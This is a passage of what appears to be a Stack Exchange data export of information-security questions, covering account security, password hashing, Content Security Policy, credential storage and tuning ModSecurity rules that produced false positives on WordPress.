"254568","1","","","2021-08-24 18:40:44","","1","211","<p>Is there a way to check if someone is trying to login to my Gmail account without knowing the password (so they keep trying to guess the password and failing repeatedly or trying to guess the answers of account recovery) as opposed to trying to login and getting the password right? (I know Gmail warns you when that happens).</p>
","","user265151","-1","","2021-08-26 06:37:58","2021-12-24 07:01:40","Is there a way to know when someone tries to guess your gmail password?","<email><account-security><gmail>","1","2","","","","CC BY-SA 4.0"
"254649","1","254650","","2021-08-26 16:03:40","","0","266","<p>Sometimes there are links on the email you have to click because they are agrements, but they are coming from a different URL. As of now what I'm doing is opening a private window and pasting the link there. Would this be an effective anti-phishing mechanism? Or can you still get hacked?</p>
<p>The reason behind my thinking of a new private window is that it doesn't expose cookies and passwords to that window. Besides that what are other dangers that could arise?</p>
<p>What is the best way to click on email links then?</p>
<p>Thanks</p>
","180041","","","","","2021-08-26 19:34:08","Is it safe to open email links in a private window?","<malware><email><account-security><phishing>","3","4","","","","CC BY-SA 4.0"
"183016","1","","","2018-04-05 16:27:52","","2","261","<p>After a user's account is locked, and an admin goes to unlock it, should the user be required to reset their password?  Or should they just be able to login without changing their password?</p>
","174888","","","","","2018-04-06 03:53:21","What should happen when an account is unlocked?","<account-security>","2","2","","","","CC BY-SA 3.0"
"183027","1","","","2018-04-05 20:10:09","","0","123","<p>Do they have lasers motion sensors etc.. more looking for the type of security system you would see in a basic house not rich / well endowed one.</p>
","174910","","","","","2018-04-05 22:33:09","how does your standard security system work?","<security-theater>","1","4","","2018-04-05 22:38:53","","CC BY-SA 3.0"
"254749","1","254750","","2021-08-30 04:01:13","","1","228","<p>I recently was dumbfounded by a question whether identity theft protection services can get hacked.  Me and my family we're T-Mobile customers in the US and after the recent T-Mobile hack we got free Identity Theft Protection from McAfee for two years.</p>
<p>Now I was setting this up for my family and when I was entering all the information of my mother in law, she asked me, what if now I give them all my information and then they get hacked.  I had no good answer.  I actually think her's was a very good question:  If T-Mobile can get hacked, then why can't McAfee get hacked too?  So why put more information out there?</p>
<p>So I thought I ask on this forum:  What answer would you give my mother-in-law why we should give our information to McAfee?  Or why not?</p>
","261430","","","","","2021-08-30 05:29:05","Can Identity Theft Protection Services Get Hacked?","<account-security><identity-theft><social-security-number><data-breaches>","1","1","","","","CC BY-SA 4.0"
"183062","1","","","2018-04-06 10:28:29","","1","257","<p>I am trying to find the smartest way to handle the root password in my product.</p>

<p>For legacy reasons, I need to have a technical account. My services create a token associated with this account directly in the DB to authenticate and access the rest of the platform. I tried to find some documentation online to make sure I was dealing with its password in the most secure way but could not come up with a straight answer.</p>

<p>Here are the two solutions I came up with:</p>

<ul>
<li><p>Set the password to a random string at every boot of the server, log it to the console in case we actually need it one day</p></li>
<li><p>Pass it as an environment variable <code>TECHNICAL_PASSWORD</code> and set it at every boot to make sure it is always up to date</p></li>
</ul>

<p>Note that the password is never used so I don't technically need to know it.</p>

<p>In terms of good practice, what would you advise?</p>
","122869","","98538","","2018-04-06 12:21:13","2018-04-06 12:21:13","Should I use a random password for my technical user?","<password-policy><account-security>","0","3","","","","CC BY-SA 3.0"
"254768","1","","","2021-08-30 19:21:56","","1","383","<p>I've seen quite a few security centric sites enforce this policy:</p>
<blockquote>
<p>Your username can only be changed once</p>
</blockquote>
<p>My question is: Is this done from a security standpoint? If yes, what is the logic behind it? My initial impression is that once you sign up your original username (and any other username you choose in the future) is linked to you indefinitely, even after you change it as allowing someone else to claim your (old) username could introduce some kind of security vulnerabilities. If a site allowed unlimited changes this could potentially reduce the pool of available usernames by a significant margin.</p>
<p>Is my analysis correct? If yes, what are some examples of security vulnerabilities created by allowing multiple changes?</p>
<p>Or am I barking up the wrong tree altogether?</p>
<p>P.S</p>
<p>I did read <a href=""https://security.stackexchange.com/questions/175802/is-it-good-or-bad-practice-to-allow-a-user-to-change-their-username%27"">this discussion</a> but the question revolves around whether username changes should be allowed at all. I'm specifically asking why some sites allow you to change your username but limit it to once over the lifetime of the account.</p>
","264419","","264419","","2021-08-30 22:28:27","2021-08-30 22:28:27","Your username can only be changed once?","<authentication><web-application><account-security><credentials><user-names>","1","0","","","","CC BY-SA 4.0"
"254785","1","255230","","2021-08-31 12:32:37","","0","269","<p>I'm trying to configure a
<a href=""https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29#secaction"" rel=""nofollow noreferrer"">SecAction</a> rule to help me tune <strong>ModSecurity 3</strong> following this <a href=""https://www.oreilly.com/content/how-to-tune-your-waf-installation-to-reduce-false-positives/"" rel=""nofollow noreferrer"">How to tune your WAF installation to reduce false positives</a> tutorial, but the rule seems to be ignored and the msg is not printed either on <code>access.log</code> or <code>error.log</code>.</p>
<pre><code>SecAction \
    &quot;id:980145,\
    phase:5,\
    pass,\
    t:none,\
    log,\
    noauditlog,\
    msg:\'Incoming Anomaly Score: %{TX.ANOMALY_SCORE}\'&quot;
</code></pre>
<p>I tried messing with the CRS rules just to see if I could change an existing rule and the changes where effective printing a different message than the original on the <code>error.log</code>, but the rule above is ignored. I think the place is so obvious it's not even mentioned on the tutorial, but I'm a newbie.</p>
<p>Checking the <a href=""https://www.nginx.com/blog/modsecurity-logging-and-debugging/#Debug-Log"" rel=""nofollow noreferrer"">Debug Log</a> level 9 I could see the following:</p>
<pre><code>grep 980145 /var/log/modsec_debug.log

[1630420852] [/image/top.jpg] [4] (Rule: 980145) Executing unconditional rule...
[1630420852] [/image/top.jpg] [4] (Rule: 980145) Executing unconditional rule...
</code></pre>
<p>But if I grep the error log for the 980145 id, nothing is printed there.</p>
<p><strong>Server:</strong></p>
<ul>
<li>nginx 1.20.1</li>
<li>modsecurity 3</li>
<li>owasp-modsecurity-crs 3.0.0</li>
</ul>
<p>What is the appropriate <code>.conf</code> file and place I should include this rule so that it's not ignored by ModSecurity when processing the rules?</p>
","265482","","265482","","2021-08-31 14:57:00","2021-09-14 20:51:50","Why is my SecAction rule being ignored?","<nginx><waf><debian><mod-security>","1","3","","","","CC BY-SA 4.0"
"254791","1","","","2021-08-31 15:46:39","","0","281","<p>They say a chain is only as secure as its weakest link. When it comes to account security it seems to me that the Forgot My Password functionality is the weakest link in the security chain because it only requires an attacker to gain access to a users email account to compromise his online account. It circumvents every other security measure such as password requirements, 2FA and so on.</p>
<p>Is it acceptable not to offer a Forgot My Password feature when security is a big concern?</p>
","264419","","","","","2021-09-14 17:29:38","Forget Me Not? Abandoning the Forgot Password Functionality","<authentication><passwords><password-management><account-security><password-reset>","4","2","","","","CC BY-SA 4.0"
"254813","1","","","2021-09-01 07:07:19","","0","570","<p>Why are people so quick to criticize <strong>Plaid</strong> for using login info when trusted apps like <strong>Mint</strong> do the same thing? They <strong>require username and password for bank info</strong>, but seem to be trusted. I wanted to use Plaid to build my own fintech app but was concerned about the raised privacy concerns so want to better understand why people trust other budget managing apps over an api like Plaids.</p>
","265527","","","","","2021-09-01 07:07:19","Security: Plaid vs Quicken vs Mint","<authentication><privacy><account-security><banks>","0","2","","","","CC BY-SA 4.0"
"254820","1","254822","","2021-09-01 14:04:31","","3","973","<p>I am trying to achieve better security in my authentication system implementation with both server-side hashing and client-side hashing. (See <a href=""https://security.stackexchange.com/questions/53594/why-is-client-side-hashing-of-a-password-so-uncommon"">the first reference below</a> for more prerequisite knowledge.)</p>
<p>As I understand it:</p>
<ol>
<li>Client-side hashing prevents hackers from getting a user's plaintext password and using it for other sites when the server app is compromised. <strong>Compared to server-side KDF hashing, it can also help lighten the server load.</strong></li>
<li>Server-side hashing prevents hackers from logging in as users when the server database is compromised.</li>
<li>KDFs such as Argon2 make it expensive for hackers to brute-force a list/dictionary of common or possible plaintext passwords against a hashed password.</li>
</ol>
<p><strong>I'd like the save some server computing resources.</strong> So here comes <strong>my question</strong>: is it safe to directly hash &quot;a password already hashed with Argon2 on the client-side&quot; on the server-side with SHA-256? <strong>Here I mean &quot;safe&quot; by being at least as safe as using server-side only Argon2.</strong> Besides, <a href=""https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence"" rel=""nofollow noreferrer"">The second reference below</a> also suggests hashing the authentication token (the so-called &quot;validator&quot; in their article) with SHA-256. Is doing this safe?</p>
<p>My answer: an Argon2-hashed password or an authentication token with a length of at least 16 bytes should be safe. The reasons are:</p>
<ol>
<li>There is no list/dictionary to try since the data is a byte string that can be anything.</li>
<li>A full rainbow table of all 16-byte-long keys should contain 2 ^ 128 entries, which takes at least 2 ^ 128 * 32 B = 2 ^ 133 B ≈ 8 * 10 ^ 39 B = 8 * 10 ^ 27 TB of storage, which is way too big.</li>
<li>Even if we take <a href=""https://en.bitcoin.it/wiki/Hash_per_second"" rel=""nofollow noreferrer"">the peak Bitcoin hash rate till now 170000 Phash/s</a>, it will still take 10 ^ 12 years to enumerate all the possibilities.</li>
</ol>
<p>However, I am no security expert so I am not sure whether there are any other flaws. So it would be nice if someone professional could share his/her opinion on this.</p>
<p>PS: Here are the related articles and questions I have read and think are useful, and got me into this question.</p>
<ol>
<li><a href=""https://security.stackexchange.com/questions/53594/why-is-client-side-hashing-of-a-password-so-uncommon"">authentication - Why is client-side hashing of a password so uncommon? - Information Security Stack Exchange</a></li>
<li><a href=""https://security.stackexchange.com/questions/53594/why-is-client-side-hashing-of-a-password-so-uncommon"">Implementing Secure User Authentication in PHP Applications with Long-Term Persistence (Login with &quot;Remember Me&quot; Cookies) - Paragon Initiative Enterprises Blog</a></li>
<li><a href=""https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"" rel=""nofollow noreferrer"">Password Storage - OWASP Cheat Sheet Series</a></li>
</ol>
","243582","","243582","","2021-09-02 07:26:43","2021-09-03 13:00:24","To lighten server load, is hashing a client-side Argon2-hashed password with SHA-256 on the server-side at least as safe as server-side only Argon2?","<authentication><passwords><hash><password-cracking><account-security>","3","15","","","","CC BY-SA 4.0"
"116396","1","116399","","2016-03-03 14:02:41","","51","6048","<p>I'm always concerned about the security of services I use. I'm even more concerned since security breaches have been happening more and more lately, and they always generate a lot of noise in the media.</p>

<p>Now I'm already trying to secure my accounts to the maximal amount possible, like using 2FA wherever possible and using a strong password manager. However these measures won't protect upon security breaches.</p>

<p><strong>Is there a somewhat reliable method to detect security breaches before they are announced so I can act and don't have to react?</strong></p>

<p><strong>Optional bonus question</strong>:
What steps can I take to ensure security of my data in case there's an unannounced breach?</p>
","71460","","87119","","2016-03-03 14:11:14","2022-07-19 14:17:14","Is it possible to detect security breaches as a user before they're announced?","<account-security>","5","13","","","","CC BY-SA 3.0"
"183194","1","183212","","2018-04-07 22:36:44","","5","1119","<p>I know that using strict values for default-src and scripts-src are a popular way to prevent (or at least limit the impact) of XSS attacks. But I was just wondering it CSPs can be used to stop attackers/pentesters from hooking browsers using the BeEF framework. </p>
","76511","","","","","2018-08-09 18:02:41","Can BeEF hooking be stopped with Content Security Policies","<xss><content-security-policy><beef>","1","1","","","","CC BY-SA 3.0"
"183236","1","183239","","2018-04-08 16:17:03","","1","99","<p>I am working on a website with accounts and I want a login scheme that does not expose users' passwords or hashes in the event of a total security failure. I would greatly appreciate some feedback on this authentication scheme:</p>

<ol>
<li>Client retrieves auth challenge from server</li>
<li>Password is hashed to 32 byte integer on client</li>
<li>Integer is used to create a keypair, PK, using static keypair generator</li>
<li>Temporary session key is generated, SK</li>
<li>Challenge is signed with PK</li>
<li>SK.public and challenge signature are encrypted with PK.private and server public key</li>
<li>Cipher is sent to server with username</li>
<li>Server decrypts cipher using associated public key for username, checks challenge signature and allows SK.public to be used for x time</li>
</ol>

<p>Edit: I'm a fool, this doesn't add any level of security. If the generator is static then it literally has no advantage over a hash. This one was super obvious and I should have caught it, but it's still a good reminder not to try to make new protocols unless you really know what you're doing.</p>
","175133","","175133","","2018-04-08 21:30:02","2018-04-08 21:30:02","Will this auth scheme be secure and protect user passwords/hashes?","<authentication><account-security>","2","5","","","","CC BY-SA 3.0"
"116466","1","","","2016-03-04 04:23:48","","-4","94","<p>In the real (physical) world, we seem to feel secure with <em>just enough</em>
security, e.g.:</p>

<ul>
<li>Our door lock isn't the most secure. Anyone can lock-pick / break
with force.</li>
<li>Our car isn't the most robust. Anyone could die in road accident.</li>
<li>In some countries, anyone can have gun.</li>
</ul>

<p>Yet people feel safe.</p>

<p>We knew very well that security is not binary. Happily trading off
for ease of use, freedom, etc. Yet in the digital world, I sense the tendency
to go toward 'security is binary', i.e. either fully secure algorithmically, or not even trying. Some cases:</p>

<ul>
<li><a href=""http://blog.elliottkember.com/chromes-insane-password-security-strategy"" rel=""nofollow"">Chrome insane password security</a> (not even trying) </li>
<li><a href=""https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2011/august/javascript-cryptography-considered-harmful/"" rel=""nofollow"">Distaste towards Javascript crypto</a> (not even trying)</li>
<li>Distaste towards obfuscation when we couldn't secure (not even trying)</li>
<li>Recent Apple vs FBI case. (Apple wants fully secure, not even they 
can crack), I propose a solution in <a href=""https://security.stackexchange.com/questions/116465/would-the-following-solve-apple-versus-fbi-case"">another question</a>.</li>
</ul>

<p>My question is thus: Why in digital world we have tendency towards
fully secure or nothing at all, while that's not the case in real world ?</p>
","103332","","","","","2016-03-04 17:30:17","Tendency towards security-is-binary in cryptography","<appsec><obfuscation><security-theater>","1","2","","2016-03-04 13:19:41","","CC BY-SA 3.0"
"116474","1","","","2016-03-04 06:22:49","","2","181","<p>Recently, my android mobile phone was lost/stolen. I had logged into several applications such as Facebook, Paytm, etc. Thus, there are chances that my personal/ transaction details might be leaked. </p>

<p>I tried Google Timeline &amp; Android Device Manager. It shows data about the last connection to the internet was before it was lost. I believe it may have been:</p>

<ol>
<li>Switched off, Or</li>
<li>Not connect to the network, Or even worse</li>
<li>Phone is factory-reset.</li>
</ol>

<p>I've no tracking software installed separately except for ADM. </p>

<p>What options do I have for remote security and tracking my device? </p>
","103348","","","","","2016-03-04 07:52:08","Information Security on a lost android phone","<android><physical><account-security><tracking>","1","1","0","","","CC BY-SA 3.0"
"42324","1","","","2013-09-12 17:36:15","","-2","10390","<p>Hi i am a little bit worried that Google Chrome is logging my keystroke.
One time ago i had situation with chrome that when i clicked some where in input box he was writting key by key(even backspace) what i wrote, and searched in google(in past few days).</p>

<p>I use Kaspersky Pure 3.0. So i think that it would be hard to get infected in other way. 
I did full scan install application to scan keylogers and firewall.
And only one application asked about log what i wrote it was chrome.</p>

<p>I think maybe this is connected with synchronisation. Because in mobile i can saw what i googled on computer. But why google remember what i wrote on some forums. And why my OS replayed button witch i pressed multiple days ago.</p>

<p>EDIT
Some days ago i wrote post on some forum. And 2 days ago in other forum. </p>

<p>When i clicked in input dialog or search bar anywhere where i could write text.
My computer was writing for me everything i written in past 2 days on some webpages what i searched in google.
It was like record all keystroke i used in past days and replay them on input. I didnt touch keyboard but i was writting using backspace and text was from my old posts.</p>
","30746","","30746","","2013-09-12 18:22:17","2013-09-12 18:22:17","Google Chrome is keylogger?","<network><keyloggers><chrome><security-theater>","1","4","","2013-09-12 18:43:19","","CC BY-SA 3.0"
"255024","1","","","2021-09-08 01:13:39","","0","97","<p>I am currently working on an implementation reading data from a csv file from within a WordPress plugin. It was suggested the file be added within the plugin in an assets directory. I have concerns in doing this. In particular, I'm worried about security and whether this makes the site vulnerable to attacks.</p>
<p>That being said, I looked at the assets folder in the frontend on my local environment and was not able to see the csv file.</p>
<p>Does anyone know if adding a csv file directly to a plugin introduce security risks?</p>
","266848","","266848","","2021-09-08 01:54:56","2021-09-08 01:54:56","Does adding a csv file to a wordpress plugin introduce security risks to the site?","<php><wordpress><content-security-policy>","0","3","","","","CC BY-SA 4.0"
"255073","1","","","2021-09-09 15:32:42","","5","503","<p>Google provides a CSP evaluator to validate if a given content-security policy is well set up (<a href=""https://github.com/google/csp-evaluator"" rel=""nofollow noreferrer"">github</a>, <a href=""https://csp-evaluator.withgoogle.com/"" rel=""nofollow noreferrer"">validator</a>). However, if one uses <code>'unsafe-inline'</code> in the <code>style-src</code> directive this is reported as 'all good' (See image below).</p>
<p>Does this not (mostly) defeat the purpose of defining a style source? As far as I understand an attacker would be able to inject CSS. Not as big of an issue as JavaScript execution, but I would not report it with a green checkmark. What am I missing here?</p>
<p><a href=""https://i.stack.imgur.com/xsRuw.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xsRuw.png"" alt=""Results from the CSP evaluator."" /></a></p>
","266932","","98538","","2022-11-29 15:03:00","2023-08-26 17:05:05","Google CSP Evaluator and style-src 'unsafe-inline'","<web-application><content-security-policy><css>","1","1","","","","CC BY-SA 4.0"
"183425","1","183427","","2018-04-10 18:28:22","","4","807","<p><strong>Question:</strong></p>

<p>I'm trying to figure out best practices for storing authentication credentials for critical company services - hosting services, domain registration services, recruiting portals, etc...  To be clear, I'm <strong>not</strong> talking about API authentication credentials (those are stored and made available to our code base using best practices), but administrative access to the actual accounts themselves.  As a randomly chosen example, imagine we used namecheap to register the domain names for our company.  There would be an email address and password connected with our namecheap account that would be needed occasionally to register more domains, update DNS settings, etc.  I'm talking about the authentication credentials to log into (for example) namecheap or other related services.  However, this isn't necessarily just limited to emails/usernames/passwords, but could also include private keys or other system-critical information.</p>

<p>I would like to securely store all such information in a way that meets a few requirements:</p>

<ol>
<li>It is easily accessible to me, as I need one piece of information or another on a regular (weekly) basis</li>
<li>If for some reason I were to no longer be available (<a href=""https://en.wikipedia.org/wiki/Bus_factor"" rel=""nofollow noreferrer"">aka the bus factor</a>) this information can be passed along to someone else to minimize disruptions for the business</li>
<li>This doesn't have to be ""easily"" accessible to another person - only accessible.  Currently no one else needs this information on a regular basis (if ever).  I just want to make sure there is a secure and easy way to transfer this information if necessary - this is not intended to be a regular occurrence.</li>
<li>The information must obviously be very secure: ""Information can be passed along"" needs to be done in such away as to minimize the chances of it being accidentally or maliciously passed along to the <strong>wrong</strong> person, since this is business-critical information.</li>
</ol>

<p><strong>Background:</strong> </p>

<p>As the ""Founding Engineer"" at my company, I registered for just about all such services myself.  There are about a half dozen very critical ones, and a dozen or so more that are not critical but still important.  All services have unique, random, and long passwords.  Passwords are therefore the bulk of what I want to store/share, but as mentioned there are also some private keys and other information that will likely make a password manager an incomplete solution.  Currently I am the only one who has access to this information, and most of it is stored on my work computer in one form or another (home directory is encrypted and my backup hard-drive is also encrypted).  Again, the issue is the fact that I am literally the only one with access.  In the event of something unexpected, I would like the company owner to be able to hire someone competent and pick up where I left off without difficulty.</p>

<p>Currently I'm leaning towards putting the information in some sort of secure cloud hosted environment that uses encryption on their end (google drive, dropbox?).  I wouldn't encrypt it myself before uploading because I expect that to hamper my own ability to access it on a regular basis.  I would choose a cloud based solution that supports 2FA via a hardware key, which I would share (along with the cloud account credentials) with the owner.</p>

<p>That's just one thought anyway.  Obviously there isn't one ""right"" solution here, but I'm looking for suggestions that meet my requirements above so I can find a balance that works well for us.</p>
","149676","","","","","2018-04-12 12:47:17","Securely storing account credentials/information for critical company services - the bus factor","<password-management><physical><account-security><storage>","2","6","","","","CC BY-SA 3.0"
"42500","1","42504","","2013-09-16 15:47:58","","64","4330","<p>In Information and IT Security there is a nasty tendency for specific ""best practices"" to become inviolable golden rules, which then leads to people recommending that they are applied regardless of whether they are appropriate for a given situation (similar to <a href=""http://en.wikipedia.org/wiki/Cargo_cult_programming"" rel=""noreferrer"">Cargo Cult Programming</a>)</p>

<p>A good example of this is the common approach to password policies which applies a one-size fits all 8-character length requirement combined with high complexity requirements, 12 previous passwords stored in a history to stop re-use, 3 incorrect attempt lockout and 30 day rotation.</p>

<p>The 30 day rotation is intended to lower the window of opportunity for an atacker to use a stolen password, however it is likely to lead users to use sequence passwords meaning that if an attacker can crack one instance they can easily work out others, actually reversing the intended security benefit.</p>

<p>The high length and complexity requirements are intended to stop brute-force attacks.  Online brute-force attacks are better mitigated with a combination of sensible lockout policies and intrusion detection, offline brute-force usually occurs when an attacker has compromised the database containing the passwords and is better mitigated by using a good storage mechanism (e.g. bcyprt, PBKDF2) also an unintended side affect is that it will lead to users finding one pattern which works and also increases the risk of the users writing the password down.  </p>

<p>The 3 incorrect lockout policy is intended to stop online brute-force attacks, but setting it too low increases account lockouts and overloads helpdesks and also places a risk of Denial of service (many online systems have easily guessed username structures like firstname.lastname, so it's easy to lock users out)</p>

<p>What are other examples of Cargo-Cult security which commonly get applied inappropriately?</p>
","37","","151946","","2017-08-03 03:21:03","2017-08-03 03:21:03","Popular Security ""Cargo Cults""","<security-theater>","8","5","","","2013-09-17 06:06:51","CC BY-SA 3.0"
"42598","1","","","2013-09-18 08:51:56","","1","856","<p>I have a NAS containing media and user files encrypted on disk. I will be running FreeNAS 9.x as my operation system, OwnCloud and SABnzbd <em>""in jail""</em>. OwnCloud will use SSL, of course. I also have a HTPC (Home theater PC‎) on my network, that runs MediaPortal and will be accessible from the Internet using AMPdroid.</p>

<p>I would like to have everything accessible from the Internet, but in a secure way.</p>

<p>What am I required to do, besides using SSL on OwnCloud?</p>
","30970","","20074","","2013-09-18 09:02:33","2013-09-18 13:40:40","Securely access OwnCloud & MediaPortal","<security-seal>","1","0","","","","CC BY-SA 3.0"
"183626","1","","","2018-04-13 09:02:39","","3","15957","<p>If you want to update your security info (such as a password). You need to verify your ID with your phone or another email. If you don't have any connected to you account (or forgot them), you can add them. After doing this you need to wait 30 days for verification and you can not change your password (and other security settings).<a href=""https://support.xbox.com/en-US/my-account/security/update-security-information"" rel=""nofollow noreferrer"">[1]</a></p>

<p>If a hacker or someone has your password, you need to wait 30 days. Before you can change it. Giving the hacker free access for 30 days.</p>

<p>Why would a company still choose to make you wait 30 days?</p>
","175608","","","","","2019-11-29 12:45:41","What is the point of Microsofts 30 day security update waiting period","<account-security><microsoft>","1","1","","","","CC BY-SA 3.0"
"183740","1","183742","","2018-04-14 20:05:02","","1","1456","<p>I was browsing for help on how to connect a PS2 controller to my pc. I found what I was looking for here:
<a href=""https://gaming.stackexchange.com/questions/262873/do-playstation-2-controllers-support-usb-connections"">https://gaming.stackexchange.com/questions/262873/do-playstation-2-controllers-support-usb-connections</a>
In the second comment he linked to a site with a guide. I right clicked and copied like a always do for safety, and pasted it in to the url bar. It showed this URL which seemed legit: <a href=""http://store.curiousinventor.com/guides/PS2"" rel=""nofollow noreferrer"">http://store.curiousinventor.com/guides/PS2</a>.
But when I entered it the url changed to this: 
<a href=""http://ec2-50-16-216-49.compute-1.amazonaws.com/"" rel=""nofollow noreferrer"">http://ec2-50-16-216-49.compute-1.amazonaws.com/</a>
I am wondering if this is some form of malware that redirected me or if is it safe? 
I just recently reinstalled windows and I have avast antivirus and windows defender on, nothing popped up. I use Brave browser if that is to any help. </p>

<p>I do not know if this is the correct place to ask this question, but I'm paranoid and couldn't find a better place...</p>

<p>Thank you for your answers!</p>
","175744","","","","","2018-09-13 14:46:00","URL changes to *.compute-1.amazonaws.com/ when entering website, do I have a problem?","<malware><account-security><url-redirection>","1","1","","","","CC BY-SA 3.0"
"183776","1","","","2018-04-15 13:01:48","","3","928","<p>I'd like to start using a password manager, but I'm not sure how to handle account recovery.</p>

<p>I'm not a criminal or a secret agent, so if I lose my master password (or my second authentication factor, like a Yubikey thumbdrive, or my own thumb), I don't want my data to be unrecoverable (and by ""my data"" , I mean ""my access right to all my accounts for which I used my password manager to store potentially automatically generated and forgettable passwords"": I can afford to lose access to my password manager, if I can reset it, and regain access to all my accounts separately with each of their account recovery options).</p>

<p>Let's assume I don't use the password manager's vault recovery, because they all seam unsafe or unpractical, when they are available. </p>

<p>The only way to be able to recover any account in any situation (phone, computer and password-list-on-a-piece-of-paper lost or taken by someone else, for example) is by using account recovery from an email address, since it only requires an internet access and a password, but it just moves the problem elsewhere. </p>

<p>For example, I could use an unique recovery email address for all accounts from a security-oriented provider like ProtonMail, and use it only for account recovery to make it less visible to potential attackers. </p>

<p>But it's still another password to remember (with the master password) and another entry point, and if I use the password manager to store this new password but lose the master password, the recovery address becomes useless. </p>

<p>The only solution I can think about is by using a trusted person (like my wife) to store on their password manager my recovery address password and to never change it (unless their master password is compromised for example), and I could do the same for theirs. That way, it's unlikely that we both lose access to our respective password managers. </p>

<p>So my question is: <strong>Which strategy is the best concerning password manager and account recovery?</strong></p>

<p>Are password managers vault recovery more secure than my propositions? Are there better alternatives?</p>

<p>P.S. : When I say ""password manager's vault recovery"", I mean ""password manager's means to recover my vault or my master password"", and when I say ""account recovery"", I mean ""account provider's means to recover my account or my password which I stored in my password manager"", for example, Facebook specific account recovery means. </p>
","137176","","137176","","2018-04-17 06:27:46","2018-04-17 09:42:34","Password manager and account recovery","<passwords><password-management><account-security><password-reset><recovery>","3","0","","","","CC BY-SA 3.0"
"255603","1","","","2021-09-27 16:41:37","","1","154","<p>In recent weeks I have seen a handful of senior employees in my organization receive a confirmation email from Wester Union for a new account creation. The issue is that none of these users have created a WU account.</p>
<p>I have verified all links in the email and it is NOT a phishing campaign. These are legitimate emails from WU. But for some reason someone out there is registering WU accounts with my employee's business email addresses.</p>
<p>What I do not understand is why. Initial thoughts would be that this is an impersonation scam. However, the user's name in WU does not match the actual user's name (which the attacker clearly has in the email address schema)</p>
<p>What motivation would someone have for this type of 'attack'?</p>
","150537","","","","","2021-09-27 16:41:37","Potential Western Union Scam - Account Registration","<email><account-security><email-spoofing><scam>","0","2","","","","CC BY-SA 4.0"
"184101","1","","","2018-04-19 19:20:42","","4","1393","<p>I have been messing about with website design for years, but I am no expert - more of a hardware junkie. </p>

<p>CSP is fascinating for me now that I am starting to branch out into web development. I was really battling with hashes for my scripts because I used an online SHA-384 generator &amp; Chrome wouldn't recognise those. Eventually I twigged that Chrome actually supplied 256-bit hashes for me, and I could include those in my .htaccess file - it was just a question of iterating over the pages on my site, grabbing the hashes, and including them in my list of approved scripts &amp; styles. </p>

<p>As I said, I am no coding master, so I have encountered a problem where Chrome doesn't give me the actual hash for a script, trunctating it to sha256..., and I have no clue what script is running (Wordpress). Before you all shout me down, I have built sites without using a CMS, but this is the platform I am working on at the moment. </p>

<p>How do I find the code for the injected script so I can hash it &amp; include it? From Mozilla's docs, I found that a hash should include all white space excluding the ""script"" tag - I tried that &amp; got nowhere with my FB Pixel code, so I deleted that, perhaps you have an answer for me on that one?</p>

<p>As for the inline injected script - I need to find out how to identify what is being injected, and how to hash it for my CSP. </p>
","175658","","98538","","2018-04-19 19:31:47","2018-05-19 20:48:10","SRI for CSP - how do I get the hash for inline code?","<content-security-policy>","1","1","","","","CC BY-SA 3.0"
"255613","1","","","2021-09-27 22:36:56","","0","795","<p>We have an issue with ModSecurity rule 941160 being triggered by the WordPress feature legacy-widget-preview because the request to upload an image file into the widget matches &quot;&lt;img src=&quot;</p>
<p>The ModSecurity log file has this:</p>
<p><code> Apache-Error: [file &quot;apache2_util.c&quot;] [line 271] [level 3] [client XXX.XXX.XXX.XXX] ModSecurity: Warning. Pattern match &quot;(?i:(?:&lt;\\\\\\\\w[\\\\\\\\s\\\\\\\\S]*[\\\\\\\\s\\\\\\\\/]|['\\\\&quot;](?:[\\\\\\\\s\\\\\\\\S]*[\\\\\\\\s\\\\\\\\/])?)(?:on(?:d(?:e(?:vice(?:(?:orienta|mo)tion|proximity|found|light)|livery(?:success|error)|activate)|r(?:ag(?:e(?:n(?:ter|d)|xit)|(?:gestur|leav)e|start|drop|over)|op)|i(?:s(?:c(?:hargingtimechange ...&quot; at ARGS:legacy-widget-preview[instance][raw][text]. [file &quot;/etc/apache2/conf.d/modsec_vendor_configs/OWASP3/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;199&quot;] [id &quot;941160&quot;] [msg &quot;NoScript XSS InjectionChecker: HTML Injection&quot;] [data &quot;Matched Data: &lt;img src= found within ARGS:legacy-widget-preview[instance][raw][text]: fg&lt;img src=\\\\x22https://XXXXXXXXX.DE/wp-content/uploads/2021/09/LMakr-0gQrGv.png\\\\x22 alt=\\\\x22\\\\x22 width=\\\\x22300\\\\x22 height=\\\\x22300\\\\x22 class=\\\\x22alignnone size-full wp-image-680\\\\x22 /&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.3.2&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/152/242&quot;] [hostname &quot;XXXXXXXXX.DE&quot;] [uri &quot;/wp-admin/widgets.php&quot;] [unique_id &quot;YVI58h7F-ItLX29cwjsTQAAzAI&quot;]</code></p>
<p>I presume the key part here is:</p>
<p>Matched Data: &lt;img src= found within ARGS:legacy-widget-preview[instance][raw][text]</p>
<p>I have attempted to write a ModSecurity rule (below) but it's not at a working point yet. I'm stuck on the last line and I'd really appreciate if someone can advise how it should be written?</p>
<pre><code>#This creates an exception to the rule excluding this phrase
SecRule REQUEST_LINE &quot;@contains /wp-admin/widgets.php?legacy-widget-preview%5BidBase%5D=text&amp;legacy-widget-preview%5Binstance%5D%5Bencoded&quot; \
    &quot;id:10001,\
    phase:1,\
    pass,\
    t:none,\
    msg:'modsec2.whitelist.conf exemption',\
    log,\
    ctl:ruleRemoveTargetById=941160;ARGS:text,\
    ctl:ruleRemoveTargetById=941160;REQUEST_HEADERS:'&lt;img src='\&quot;```
</code></pre>
","264899","","264899","","2021-09-29 19:27:13","2022-11-03 19:09:16","ModSecurity rule 941160 triggered by WordPress legacy-widget-preview","<owasp><mod-security>","1","1","","","","CC BY-SA 4.0"
"255752","1","","","2021-10-02 23:04:24","","0","415","<p>Sorry if this is a &quot;noob&quot; mistake, which I am sure it is, but I can't figure out why ModSec is ignoring my rule exception.</p>
